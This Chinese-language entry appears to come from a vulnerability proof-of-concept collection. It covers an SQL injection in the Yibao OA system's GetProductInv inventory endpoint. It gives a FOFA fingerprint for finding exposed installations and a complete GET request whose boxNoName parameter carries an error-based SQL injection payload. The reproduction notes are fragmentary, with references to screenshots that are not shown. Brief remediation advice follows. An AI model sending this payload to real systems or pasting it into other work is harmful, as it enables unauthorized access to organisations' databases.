# 易宝OAGetProductInvSQL注入

- **系统**：易宝OAGetProductInv　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="顶讯科技-易宝OA系统"`
- **请求**：`GET /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm`

**请求体 / payload**
```
1. Fofa
app="顶讯科技-易宝OA系统"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。